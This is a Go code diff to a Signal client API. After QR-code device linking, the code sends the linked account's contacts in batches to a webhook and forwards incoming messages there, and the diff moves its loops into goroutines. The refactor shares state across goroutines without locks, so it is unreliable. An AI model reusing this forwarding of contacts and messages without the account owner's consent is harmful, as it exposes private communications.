@@ -262,12 +262,12 @@ func NewApi(signalClient *client.SignalClient) *Api {
 // StartBroadcasting initiates a Signal client WebSocket session,
 // subscribes to the channel, handles QR code authentication,
 // and continuously processes messages or resends QR codes if needed.
-func (a *Api) StartBroadcasting(roomID string) {
+func (a *Api) StartBroadcasting(roomId string) {
 	emptyJsonFile()
 	log.Println("🔄 Starting Signal broadcast session...")
 
 	// Establish WebSocket connection and get identifier JSON for subscription
-	conn, identifierJSON := a.connectToWebSocket(roomID)
+	conn, identifierJSON := a.connectToWebSocket(roomId)
 
 	// Subscribe to the SignalChannel using the WebSocket connection
 	if err := a.subscribeToChannel(conn, identifierJSON); err != nil {
@@ -279,31 +279,32 @@ func (a *Api) StartBroadcasting(roomID string) {
 	var (
 		account       string
 		authCompleted string    // Tracks whether authentication is complete
-		lastQRTime    time.Time // Time when the last QR code was sent
 	)
 
 	// Loop continuously to handle authentication and message flow
-	for {
-		// If authentication has not been completed, try to authenticate
-		if authCompleted == "" {
+	go func() {
+		for {
+			a.handleMessage(conn, identifierJSON, &authCompleted, roomId, account)
+		}
+	}()
+	go func() {
+		for {
 			account = a.tryAuthenticate(conn, identifierJSON)
 			if account != "" {
-				authCompleted = "authCompleted"
+				a.setMessageReciever(account, roomId, conn, identifierJSON)
+				break
 			}
-		} else if authCompleted == "stopAuthPolling" {
-			break
 		}
-
-		// If the last QR code was sent within 45 seconds, handle messages instead of resending
-		if !lastQRTime.IsZero() && time.Since(lastQRTime) <= 45*time.Second {
-			a.handleMessage(conn, identifierJSON, &authCompleted, roomID, account)
-			continue
+	}()
+	go func() {
+		for {
+			if authCompleted == "stopAuthPolling" {
+				break
+			}
+			a.sendQRCode(conn, identifierJSON)
+			time.Sleep(45 * time.Second)
 		}
-
-		// Send a new QR code and update the time it was sent
-		a.sendQRCode(conn, identifierJSON)
-		lastQRTime = time.Now()
-	}
+	}()
 }
 
 // connectToWebSocket establishes a WebSocket connection using the configured URL
@@ -452,13 +453,8 @@ func (a *Api) processMessageByType(
 	var msgType = msgData["type"]
 	switch msgType {
 	case "verification_message_received":
-		if authCompleted != nil && *authCompleted != "" {
-			a.sendContactsToWebhook(account, roomId)
-			a.setMessageReciever(account, roomId, conn, identifierJSON)
-			*authCompleted = "stopAuthPolling" // Stop polling after sending contacts
-		} else {
-			log.Println("⚠️ authCompleted is nil or empty; skipping sendContactsToWebhook")
-		}
+		a.sendContactsToWebhook(account, roomId)
+		*authCompleted = "stopAuthPolling" // Stop polling after sending contacts
 
 	case "request_qr_code":
 		a.sendQRCode(conn, identifierJSON)
@@ -561,91 +557,87 @@ func (a *Api) sendContactsToWebhook(account, jobID string) {
 
 	total := len(contacts)
 	log.Printf("📤 Sending %d contacts in batches of %d...", total, batchSize)
+	go func() {
+		// Iterate through contacts in batches
+		for i := 0; i < total; i += batchSize {
+			// Determine the end index for the current batch
+			end := i + batchSize
+			if end > total {
+				end = total
+			}
+			batch := contacts[i:end]
 
-	// Iterate through contacts in batches
-	for i := 0; i < total; i += batchSize {
-		// Determine the end index for the current batch
-		end := i + batchSize
-		if end > total {
-			end = total
-		}
-		batch := contacts[i:end]
+			// Prepare the JSON payload with the batch and metadata
+			payload := map[string]interface{}{
+				"data":          batch,     // Current batch of contacts
+				"bulk_contacts": true,      // Indicates this is a batch send
+				"job_id":        jobID,     // Identifier for tracking job
+				"service":       "contact", // Type of service
+			}
 
-		// Prepare the JSON payload with the batch and metadata
-		payload := map[string]interface{}{
-			"data":          batch,     // Current batch of contacts
-			"bulk_contacts": true,      // Indicates this is a batch send
-			"job_id":        jobID,     // Identifier for tracking job
-			"service":       "contact", // Type of service
-		}
+			// Marshal payload to JSON
+			data, err := json.Marshal(payload)
+			if err != nil {
+				log.Printf("❌ Failed to marshal payload for batch %d: %v", i/batchSize+1, err)
+				continue
+			}
 
-		// Marshal payload to JSON
-		data, err := json.Marshal(payload)
-		if err != nil {
-			log.Printf("❌ Failed to marshal payload for batch %d: %v", i/batchSize+1, err)
-			continue
-		}
-
-		// Send POST request to the webhook with the payload
-		resp, err := http.Post(
-			webhookURL,
-			"application/json",
-			bytes.NewBuffer(data),
-		)
-
-		if err != nil {
-			log.Printf("❌ Error sending batch %d: %v", i/batchSize+1, err)
-		} else {
-			body, _ := io.ReadAll(resp.Body)
-			resp.Body.Close()
-			log.Printf("✅ Sent batch %d/%d, response: %s",
-				i/batchSize+1,
-				(total+batchSize-1)/batchSize, // Total number of batches
-				string(body),
+			// Send POST request to the webhook with the payload
+			resp, err := http.Post(
+				webhookURL,
+				"application/json",
+				bytes.NewBuffer(data),
 			)
+
+			if err != nil {
+				log.Printf("❌ Error sending batch %d: %v", i/batchSize+1, err)
+			} else {
+				body, _ := io.ReadAll(resp.Body)
+				resp.Body.Close()
+				log.Printf("✅ Sent batch %d/%d, response: %s",
+					i/batchSize+1,
+					(total+batchSize-1)/batchSize, // Total number of batches
+					string(body),
+				)
+			}
+
+			// Pause between sending batches to avoid overwhelming the server
+			time.Sleep(delayBetweenBatches)
 		}
 
-		// Pause between sending batches to avoid overwhelming the server
-		time.Sleep(delayBetweenBatches)
-	}
-
-	log.Println("✅ All contact batches sent successfully.")
+		log.Println("✅ All contact batches sent successfully.")
+	}()
 }
 
 func (a *Api) setMessageReciever(primaryNumber string, roomId string, conn *websocket.Conn, identifierJSON []byte) {
 	number := primaryNumber
-	var authCompleted = "MessageStarted"
 
 	go func() {
 		for {
-			a.handleMessage(conn, identifierJSON, &authCompleted, roomId, number)
+			// Poll every 2 seconds
+			time.Sleep(2 * time.Second)
+
+			// Call the existing Receive method
+			jsonStr, err := a.signalClient.Receive(
+				number,
+				5,     // timeout in seconds
+				false, // ignoreAttachments
+				false, // ignoreStories
+				10,    // maxMessages
+				false, // sendReadReceipts
+			)
+			if err != nil {
+				log.Printf("Receive error: %v", err)
+				continue
+			}
+
+			// Forward received message to handler
+			if len(jsonStr) > 0 {
+				println("Received message:", jsonStr)
+				a.sendMessagesToWebhook(jsonStr, number, roomId)
+			}
 		}
 	}()
-
-	for {
-		// Poll every 2 seconds
-		time.Sleep(2 * time.Second)
-
-		// Call the existing Receive method
-		jsonStr, err := a.signalClient.Receive(
-			number,
-			5,     // timeout in seconds
-			false, // ignoreAttachments
-			false, // ignoreStories
-			10,    // maxMessages
-			false, // sendReadReceipts
-		)
-		if err != nil {
-			log.Printf("Receive error: %v", err)
-			continue
-		}
-
-		// Forward received message to handler
-		if len(jsonStr) > 0 {
-			println("Received message:", jsonStr)
-			a.sendMessagesToWebhook(jsonStr, number, roomId)
-		}
-	}
 }
 
 func (a *Api) sendMessagesToWebhook(rawJson string, number string, roomId string) {
@@ -655,62 +647,64 @@ func (a *Api) sendMessagesToWebhook(rawJson string, number string, roomId string
 		return
 	}
 
-	for _, msg := range messages {
-		payload, err := json.Marshal(msg)
-		if err != nil {
-			log.Printf("Failed to marshal message: %v\n", err)
-			continue
-		}
-
-		var msgMap map[string]interface{}
-		if err := json.Unmarshal(payload, &msgMap); err != nil {
-			log.Printf("Failed to unmarshal message for field access: %v\n", err)
-			continue
-		}
-
-		log.Println("Extracted message map:", msgMap)
-
-		// Corrected "envelop" to "envelope"
-		envelope, ok := msgMap["envelope"].(map[string]interface{})
-		if !ok {
-			log.Println("Key 'envelope' missing or not a map")
-			continue
-		}
-
-		// Check for syncMessage (can contain sentMessage)
-		syncMessage, syncOk := envelope["syncMessage"].(map[string]interface{})
-		if syncOk {
-			sentMessage, ok := syncMessage["sentMessage"].(map[string]interface{})
-			if !ok {
-				log.Println("'syncMessage' missing or not a map")
+	go func() {
+		for _, msg := range messages {
+			payload, err := json.Marshal(msg)
+			if err != nil {
+				log.Printf("Failed to marshal message: %v\n", err)
 				continue
 			}
-			if sentMessage["reaction"] != nil {
+
+			var msgMap map[string]interface{}
+			if err := json.Unmarshal(payload, &msgMap); err != nil {
+				log.Printf("Failed to unmarshal message for field access: %v\n", err)
+				continue
+			}
+
+			log.Println("Extracted message map:", msgMap)
+
+			// Corrected "envelop" to "envelope"
+			envelope, ok := msgMap["envelope"].(map[string]interface{})
+			if !ok {
+				log.Println("Key 'envelope' missing or not a map")
+				continue
+			}
+
+			// Check for syncMessage (can contain sentMessage)
+			syncMessage, syncOk := envelope["syncMessage"].(map[string]interface{})
+			if syncOk {
+				sentMessage, ok := syncMessage["sentMessage"].(map[string]interface{})
+				if !ok {
+					log.Println("'syncMessage' missing or not a map")
+					continue
+				}
+				if sentMessage["reaction"] != nil {
+					log.Println("Ignoring reaction message")
+					continue
+				}
+			}
+
+			dataMessage, dataOk := envelope["dataMessage"].(map[string]interface{})
+			_, editMessage := envelope["editMessage"].(map[string]interface{})
+			if !dataOk && !syncOk && !editMessage {
+				log.Println("'dataMessage' missing or not a map")
+				continue
+			}
+			if dataMessage["reaction"] != nil {
 				log.Println("Ignoring reaction message")
 				continue
 			}
-		}
 
-		dataMessage, dataOk := envelope["dataMessage"].(map[string]interface{})
-		_, editMessage := envelope["editMessage"].(map[string]interface{})
-		if !dataOk && !syncOk && !editMessage {
-			log.Println("'dataMessage' missing or not a map")
-			continue
-		}
-		if dataMessage["reaction"] != nil {
-			log.Println("Ignoring reaction message")
-			continue
-		}
+			params := map[string]interface{}{
+				"service": "message",
+				"job_id":  roomId,
+				"value":   msgMap,
+			}
 
-		params := map[string]interface{}{
-			"service": "message",
-			"job_id":  roomId,
-			"value":   msgMap,
+			log.Println("Sending message to webhook:", params)
+			a.sendMessageToWebhook(params)
 		}
-
-		log.Println("Sending message to webhook:", params)
-		a.sendMessageToWebhook(params)
-	}
+	}()
 }
 
 func (a *Api) sendMessageToWebhook(sentMessage interface{}) {
@@ -1036,63 +1030,64 @@ func (a *Api) handleSignalReceive(ws *websocket.Conn, number string, stop chan s
 		log.Error("Couldn't get receive channel: ", err.Error())
 		return
 	}
+	go func() {
+		for {
+			select {
+			case <-stop:
+				a.signalClient.RemoveReceiveChannel(channelUuid)
+				ws.Close()
+				return
+			case msg := <-receiveChannel:
+				var data string = string(msg.Params)
+				var err error = nil
+				if msg.Err.Code != 0 {
+					err = errors.New(msg.Err.Message)
+				}
 
-	for {
-		select {
-		case <-stop:
-			a.signalClient.RemoveReceiveChannel(channelUuid)
-			ws.Close()
-			return
-		case msg := <-receiveChannel:
-			var data string = string(msg.Params)
-			var err error = nil
-			if msg.Err.Code != 0 {
-				err = errors.New(msg.Err.Message)
-			}
-
-			if err == nil {
-				if data != "" {
-					type Response struct {
-						Account string `json:"account"`
-					}
-					var response Response
-					err = json.Unmarshal([]byte(data), &response)
-					if err != nil {
-						log.Error("Couldn't parse message ", data, ":", err.Error())
-						continue
-					}
-
-					if response.Account == number {
-						a.wsMutex.Lock()
-						err = ws.WriteMessage(websocket.TextMessage, []byte(data))
+				if err == nil {
+					if data != "" {
+						type Response struct {
+							Account string `json:"account"`
+						}
+						var response Response
+						err = json.Unmarshal([]byte(data), &response)
 						if err != nil {
-							if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
-								log.Error("Couldn't write message: " + err.Error())
+							log.Error("Couldn't parse message ", data, ":", err.Error())
+							continue
+						}
+
+						if response.Account == number {
+							a.wsMutex.Lock()
+							err = ws.WriteMessage(websocket.TextMessage, []byte(data))
+							if err != nil {
+								if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
+									log.Error("Couldn't write message: " + err.Error())
+								}
+								a.wsMutex.Unlock()
+								return
 							}
 							a.wsMutex.Unlock()
-							return
 						}
-						a.wsMutex.Unlock()
 					}
-				}
-			} else {
-				errorMsg := Error{Msg: err.Error()}
-				errorMsgBytes, err := json.Marshal(errorMsg)
-				if err != nil {
-					log.Error("Couldn't serialize error message: " + err.Error())
-					return
-				}
-				a.wsMutex.Lock()
-				err = ws.WriteMessage(websocket.TextMessage, errorMsgBytes)
-				if err != nil {
-					log.Error("Couldn't write message: " + err.Error())
+				} else {
+					errorMsg := Error{Msg: err.Error()}
+					errorMsgBytes, err := json.Marshal(errorMsg)
+					if err != nil {
+						log.Error("Couldn't serialize error message: " + err.Error())
+						return
+					}
+					a.wsMutex.Lock()
+					err = ws.WriteMessage(websocket.TextMessage, errorMsgBytes)
+					if err != nil {
+						log.Error("Couldn't write message: " + err.Error())
+						a.wsMutex.Unlock()
+						return
+					}
 					a.wsMutex.Unlock()
-					return
 				}
-				a.wsMutex.Unlock()
 			}
 		}
-	}
+	}()
 }
 
 func wsPong(ws *websocket.Conn, stop chan struct{}) {
